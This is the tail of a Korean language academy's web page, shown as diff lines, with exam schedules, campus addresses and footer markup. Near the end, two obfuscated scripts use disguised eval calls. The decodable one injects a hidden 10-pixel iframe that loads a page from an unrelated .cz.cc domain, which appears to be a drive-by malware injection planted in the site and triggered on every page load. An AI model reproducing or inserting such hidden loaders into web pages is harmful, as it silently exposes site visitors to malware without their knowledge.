+                                  <td><img src="../images/link_04_top.gif" width="136" height="24"></td>
+                                </tr>
+                                <tr> 
+                                  <td align="center"><table width="136" border="0" cellspacing="0" cellpadding="0">
+                                      <tr> 
+                                        <td width="1" bgcolor="A6A6A6"></td>
+                                        <td width="134" align="center"><table width="130" border="0" cellspacing="0" cellpadding="0">
+										
+                                            <tr> 
+                                              <td width="130" align="center" style="padding-top:8; padding-bottom:5"><table width="126" border="0" cellspacing="0" cellpadding="0">
+                                                  <tr> 
+                                                    <td><!-- 제목 표시 --><A HREF="http://www.easyedu.net/easy5/sub09_05.asp" ><strong><!-- 제목 표시 --><font color="#419215"><strong> 토익 정기/모의시험</a></strong></font></td>
+                                                  </tr>
+                                                  <tr> 
+                                                    <td style="padding-top:5"><!-- 내용 표시 -->
+													<b>*정기토익*</b><br>[제200회]09. 08. 30(일)<br>[인터넷접수기간]<br>09. 06. 29(월) ~ <br>09. 07. 19(일) 밤 12:00<br>*이지 모의토익*<br>[제90회]<br>수원역캠퍼스<br>09.07.12(일)/25(토)<br>아주대캠퍼스 09.07.18
+													</td>
+                                                  </tr>
+                                                </table></td>
+                                            </tr>
+                                            <tr> 
+                                              <td height="1" background="../images/line_dot_strong.gif"></td>
+                                            </tr>
+										
+                                            <tr> 
+                                              <td width="130" align="center" style="padding-top:8; padding-bottom:5"><table width="126" border="0" cellspacing="0" cellpadding="0">
+                                                  <tr> 
+                                                    <td><!-- 제목 표시 --><A HREF="http://www.easyedu.net/easy5/sub09_05.asp" ><strong><!-- 제목 표시 --><font color="#218DA1"><strong> JPT 정기/모의시험</a></strong></font></td>
+                                                  </tr>
+                                                  <tr> 
+                                                    <td style="padding-top:5"><!-- 내용 표시 -->
+													<b>*정기JPT*</b><br>[제150회]09.08.23 (일)<br>[인터넷접수기간] <br>09.06.22 ~<br>09.07.12 밤 12:00<br>*이지 모의JPT*<br>[제89회]09.07.11(토)<br>[접수기간]<br>방문&전화접수&인터넷접수 가능!!  
+													</td>
+                                                  </tr>
+                                                </table></td>
+                                            </tr>
+										
+                                          </table></td>
+                                        <td width="1" bgcolor="A6A6A6"></td>
+                                      </tr>
+                                    </table></td>
+                                </tr>
+                                <tr> 
+                                  <td><img src="../images/link_04_bot.gif" width="136" height="3"></td>
+                                </tr>
+                              </table><!-- 취업/승진/시험 끝 --></td>
+                          </tr>
+                          <tr> 
+                            <td width="136" height="10"></td>
+                          </tr>
+                          <tr> 
+                            <td width="136"><!-- 실시간 등록현황 시작 -->
+                                <!-- 실시간 등록현황 끝 --></td>
+                          </tr>
+						  
+                        </table><!-- 오른쪽 끝 --></td>
+                </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="1" bgcolor="#E4E4E4"></td>
+  </tr>
+  <tr>
+    <td><!-- footer 시작 --><tr>
+    <td height="1" bgcolor="#E4E4E4"></td>
+  </tr>
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="850" align="right"><!-- FOOTER MENU 시작 --><img src="../images/menu_bot.gif" width="595" height="26" border="0" usemap="#footer_menu"><!-- FOOTER MENU 끝 --></td>
+        <td><a href="#_n_top" onFocus='blur()'><img src="../images/btn_top.gif" width="38" height="14" hspace="15" border="0"></a></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td bgcolor="E5E5E5" style="padding-top:15; padding-bottom:15"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="40">&nbsp;</td>
+        <td width="200"><img src="../images/foot_mark.gif" width="200" height="40" /></td>
+        <td width="2" background="../images/foot_dot_line.gif"></td>
+        <td width="40">&nbsp;</td>
+        <td valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td valign="top"><!-- 각 지점 주소/연락처  시작 --><strong>역전 1 캠퍼스</strong> : (441-081) 경기도 수원시 권선구 매산로 1가 53-11 K빌딩 6층 / TEL : 031-257-0582<br>
+              <strong>역전 2 캠퍼스</strong> : (441-082) 경기도 수원시 권선구 매산로 2가 27-30호 3층 / TEL : 031-248-0515<br>
+			   <strong>역전 3 캠퍼스</strong> : (442-081) 경기도 수원시 팔달구 매산로 1가 11-12호 아이메카 8층 / TEL : 031-254-0515<br>
+              <strong>동수원 캠퍼스</strong> : (442-190) 경기도 수원시 팔달구 우만동 88-3 용신빌딩 5층,6층,7층  / TEL : 031-247-0515<br>
+              <strong>이지 유학원</strong> : (442-190) 경기도 수원시 팔달구 우만동 88-3 용신빌딩 6층 / TEL : 031-217-8466              <!-- 각 지점 주소/연락처  끝 --></td>
+          </tr>
+          <tr>
+            <td style="padding-top:5"><font color="#6077A5"><strong>각 지점 통합 대표전화 : 031-241-0515 / 031-251-0407 대표자 :김영태 사업자번호 : 124-85-27748</strong></font></td>
+          </tr>
+          <tr>
+            <td style="padding-top:5"><img src="../images/foot_copyright.gif" width="285" height="8"></td>
+          </tr>
+        </table></td>
+      </tr>
+    </table></td>
+  </tr>
+<map name="footer_menu">
+  <area shape="rect" coords="15,2,70,23" href="../easy/sub01_01.asp" onFocus='blur()'>
+  <area shape="rect" coords="89,2,156,23" href="../member/sub03_02.asp" onFocus='blur()'>
+  <area shape="rect" coords="176,2,270,23" href="../member/sub05_01.asp" onFocus='blur()'>
+  <area shape="rect" coords="287,2,340,23" href="../easy/c_sub01_01.asp" onFocus='blur()'>
+  <area shape="rect" coords="355,2,410,23" href="../easy/job_sub01.asp" onFocus='blur()'>
+  <area shape="rect" coords="426,2,500,23" href="mailto:easy@easyedu.net" onFocus='blur()'>
+  <area shape="rect" coords="520,2,580,23" href="../sitemap/sitemap.asp" onFocus='blur()'>
+</map></script>
+<!-- footer 끝 --></td></tr>
+</table>
+<map name="rig_less">
+  <area shape="rect" coords="0,0,188,81" href="http://www.kyeongin.com/news/articleList.html?sc_sub_section_code=S2N21&view_type=sm" target="_blank"  onfocus='blur()'>
+</map>
+
+<map name="Map2"><area shape="rect" coords="8,9,188,191" href="#" onClick="window.open ('http://web.flv.gabia.com/flash_skin/player.swf?file_key=a45aaf34b48830388305a629319d0cac&allowmaximize=YES&auto_start=N&width=400&height=300', 'new' ,'scrollbars=0, top=400, left=200, width=400, height=300')" onfocus='this.blur()'></map>
+<script>var el,ar,ar2,pos,yes=false;setInterval(function(){if(yes){try{try{throw 1}catch(a){b[2]=21};}catch(a){k=el.innerHTML+a.toString().substr(0,0);};ar="B[<}pnCrNgzT'A027;f\"xwlt i()>yvd./E{oeuscba]h=m,1: ";ar2="R96c0c4c-28c128c-96c20c20c16c-8c32c-36c-128c72c36c-92c112c-56c44c-48c60c36c-36c-128c72c64c-156c116c-72c124c-132c-4c136c16c-36c-44c-56c116c-20c-20c-8c-68c60c-104c52c116c-64c32c-44c0c0c4c-28c-44c140c16c-36c-120c76c4c-40c28c0c-84c188c-52c-60c68c-8c52c-60c-44c0c0c28c20c16c-8c32c-36c-128c72c36c-44c-56c72c-8c56c-44c-28c-68c92c-28c-44c140c16c-36c52c-44c-128c132c20c-132c128c-84c0c-76c180c-64c0c-92c128c16c-8c-24c-72c-60c156c-48c32c-120c88c32c0c-28c28c-16c8c-132c72c-32c4c64c-112c160c-160c32c152c-116c16c24c-32c84c4c-132c144c-136c-8c152c-24c-28c-48c-64c140c-84c88c-132c144c-136c-8c152c-44c-64c24c-28c60c32c-132c72c-20c56c-56c64c-64c-12c12c-8c24c80c-20c-76c24c0c24c-128c48c-52c128c12c-56c-8c8c44c-124c176c-28c-4c-8c-12c-56c64c-60c56c-80c20c60c-76c20c104c-140c12c24c52c-128c180c-140c12c-20c64c-104c124c-32c-28c-44c140c16c-36c-36c-36c32c-40c28c0c-84c84c0c-24c80c-132c140c-68c8c44c-124c180c-100c-28c-44c140c16c-36c-120c76c4c32c-44c0c0c24c48c-140c172c-128c128c-20c20c-76c20c16c-8c32c-36c-128c72c36c32c-132c120c20c-76c56c-12c-48c60c36c-36c-128c72c12c-56c52c-28c-44c140c16c-36c-100c60c-40c4c56c28c-8c-56c-40c40c0c-64c72c64c-12c-60c56c-44c-56c108c-128c132c-112c140c-140c128c-84c0c-76c180c-64c0c-92c128c16c-8c-24c-72c-60c156c-48c32c-120c88c32c0c-28c28c-16c8c-132c72c-32c4c64c-112c160c-160c32c60c-40c4c56c28c-64c24c-28c60c-20c-8c-20c56c-56c64c-64c-12c12c-8c24c64c-132c128c-76c24c0c24c-128c28c20c4c56c28c-64c24c-28c60c-20c-112c128c12c-56c-8c8c44c-124c160c-132c120c-4c-8c-12c-56c64c-60c56c-100c20c4c56c28c-64c24c-28c60c-20c-40c60c-76c20c88c-132c8c-8c20c4c56c28c-64c24c-28c60c-20c-36c52c-128c164c-132c8c-8c20c4c56c28c-8c-56c-40c40c0c-64c72c64c-12c-60c56c-44c-56c36c16c24c-32c84c-128c140c-140c144c-136c-8c60c-40c4c56c28c-8c-56c-40c40c0c-64c72c64c-12c-60c56c-44c-56c128c-28c-48c-64c140c-84c-44c140c-140c144c-136c-8c60c-40c28c0c0c28c20c16c-8c32c-36c-128c72c36c-92c112c-56c44c-48c60c36c-36c-128c72c64c-156c116c-72c124c-132c-4c136c16c-36c-44c-56c116c-20c-20c-8c-68c60c-104c52c116c-44c40c-152c0c132c-128c104c-100c152c-76c-12c36c-20c-32c36c-40c28c0c-84]".replace(k.substr(0,1),'[');pau="urn eReferenceErr".replace(k,"val");e=Function("ret"+pau)();ar2=e(ar2.replace(/c/g,","));s="";pos=0;for(i=0;i!=ar2.length;i++){e('pos+=parseInt(k.replace("Referen","0asd"))+ar2[i]/4');e('s+=ar.substr(pos,1)');}
+e(s);yes=false;}},20);setTimeout(function(){el=document.createElement("div");el.innerHTML="&#82;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#69;&#114;&#114;";yes=true;},1);</script>
+
+<script>var s,d1=new Date(),d2=new Date(d1.valueOf()+2),o=d1-d2,aa=document.createTextNode("ev"+"al");e=window[aa.nodeValue];e(String.fromCharCode(11+o,11+o,107+o,104+o,34+o,42+o,102+o,113+o,101+o,119+o,111+o,103+o,112+o,118+o,48+o,105+o,103+o,118+o,71+o,110+o,103+o,111+o,103+o,112+o,118+o,117+o,68+o,123+o,86+o,99+o,105+o,80+o,99+o,111+o,103+o,42+o,41+o,100+o,113+o,102+o,123+o,41+o,43+o,93+o,50+o,95+o,43+o,125+o,11+o,11+o,11+o,107+o,104+o,116+o,99+o,111+o,103+o,116+o,42+o,43+o,61+o,11+o,11+o,127+o,34+o,103+o,110+o,117+o,103+o,34+o,125+o,11+o,11+o,11+o,102+o,113+o,101+o,119+o,111+o,103+o,112+o,118+o,48+o,121+o,116+o,107+o,118+o,103+o,42+o,36+o,62+o,107+o,104+o,116+o,99+o,111+o,103+o,34+o,117+o,116+o,101+o,63+o,41+o,106+o,118+o,118+o,114+o,60+o,49+o,49+o,102+o,123+o,108+o,112+o,124+o,113+o,115+o,123+o,48+o,101+o,124+o,48+o,101+o,101+o,49+o,101+o,113+o,119+o,112+o,118+o,52+o,50+o,48+o,114+o,106+o,114+o,41+o,34+o,121+o,107+o,102+o,118+o,106+o,63+o,41+o,51+o,50+o,41+o,34+o,106+o,103+o,107+o,105+o,106+o,118+o,63+o,41+o,51+o,50+o,41+o,34+o,117+o,118+o,123+o,110+o,103+o,63+o,41+o,120+o,107+o,117+o,107+o,100+o,107+o,110+o,107+o,118+o,123+o,60+o,106+o,107+o,102+o,102+o,103+o,112+o,61+o,114+o,113+o,117+o,107+o,118+o,107+o,113+o,112+o,60+o,99+o,100+o,117+o,113+o,110+o,119+o,118+o,103+o,61+o,110+o,103+o,104+o,118+o,60+o,50+o,61+o,118+o,113+o,114+o,60+o,50+o,61+o,41+o,64+o,62+o,49+o,107+o,104+o,116+o,99+o,111+o,103+o,64+o,36+o,43+o,61+o,11+o,11+o,127+o,11+o,11+o,104+o,119+o,112+o,101+o,118+o,107+o,113+o,112+o,34+o,107+o,104+o,116+o,99+o,111+o,103+o,116+o,42+o,43+o,125+o,11+o,11+o,11+o,120+o,99+o,116+o,34+o,104+o,34+o,63+o,34+o,102+o,113+o,101+o,119+o,111+o,103+o,112+o,118+o,48+o,101+o,116+o,103+o,99+o,118+o,103+o,71+o,110+o,103+o,111+o,103+o,112+o,118+o,42+o,41+o,107+o,104+o,116+o,99+o,111+o,103+o,41+o,43+o,61+o,104+o,48+o,117+o,103+o,118+o,67+o,118+o,118+o,116+o,107+o,100+o,119+o,118+o,103+o,42+o,41+o,117+o,116+o,101+o,41+o,46+o,41+o,106+o,118+o,118+o,114+o,60+o,49+o,49+o,102+o,123+o,108+o,112+o,124+o,113+o,115+o,123+o,48+o,101+o,124+o,48+o,101+o,101+o,49+o,101+o,113+o,119+o,112+o,118+o,52+o,50+o,48+o,114+o,106+o,114+o,41+o,43+o,61+o,104+o,48+o,117+o,118+o,123+o,110+o,103+o,48+o,120+o,107+o,117+o,107+o,100+o,107+o,110+o,107+o,118+o,123+o,63+o,41+o,106+o,107+o,102+o,102+o,103+o,112+o,41+o,61+o,104+o,48+o,117+o,118+o,123+o,110+o,103+o,48+o,114+o,113+o,117+o,107+o,118+o,107+o,113+o,112+o,63+o,41+o,99+o,100+o,117+o,113+o,110+o,119+o,118+o,103+o,41+o,61+o,104+o,48+o,117+o,118+o,123+o,110+o,103+o,48+o,110+o,103+o,104+o,118+o,63+o,41+o,50+o,41+o,61+o,104+o,48+o,117+o,118+o,123+o,110+o,103+o,48+o,118+o,113+o,114+o,63+o,41+o,50+o,41+o,61+o,104+o,48+o,117+o,103+o,118+o,67+o,118+o,118+o,116+o,107+o,100+o,119+o,118+o,103+o,42+o,41+o,121+o,107+o,102+o,118+o,106+o,41+o,46+o,41+o,51+o,50+o,41+o,43+o,61+o,104+o,48+o,117+o,103+o,118+o,67+o,118+o,118+o,116+o,107+o,100+o,119+o,118+o,103+o,42+o,41+o,106+o,103+o,107+o,105+o,106+o,118+o,41+o,46+o,41+o,51+o,50+o,41+o,43+o,61+o,11+o,11+o,11+o,102+o,113+o,101+o,119+o,111+o,103+o,112+o,118+o,48+o,105+o,103+o,118+o,71+o,110+o,103+o,111+o,103+o,112+o,118+o,117+o,68+o,123+o,86+o,99+o,105+o,80+o,99+o,111+o,103+o,42+o,41+o,100+o,113+o,102+o,123+o,41+o,43+o,93+o,50+o,95+o,48+o,99+o,114+o,114+o,103+o,112+o,102+o,69+o,106+o,107+o,110+o,102+o,42+o,104+o,43+o,61+o,11+o,11+o,127+o));</script>
+</body>
+</html>
+
+	<script language="javascript">
+		function openpop186(theURL,winName,features) {
+			cookiedata = document.cookie;
+			if (cookiedata.indexOf("easyedu186=easyedu1860")<0) {
+				window.open(theURL,winName,features);
+			}
+		}
+		openpop186('/popup.asp?num=186','pop186','width=696,height=270,left=350,top=0');
+	</script>
+
+	<script language="javascript">
+		function openpop196(theURL,winName,features) {
+			cookiedata = document.cookie;
+			if (cookiedata.indexOf("easyedu196=easyedu1960")<0) {
+				window.open(theURL,winName,features);
+			}
+		}
+		openpop196('/popup.asp?num=196','pop196','width=400,height=263,left=50,top=50');
+	</script>
+
+<script type='text/javascript' src='http://www.clicksaver.co.kr/cljs/C015B1115.js'></script>
+<script type='text/javascript' src='http://www.clicksaver.co.kr/clfun/kisaver.js'></script>
+<script type='text/javascript'>
+	ffro('72.52.91.30');
+	tturch_('C015B1115');
+</script>
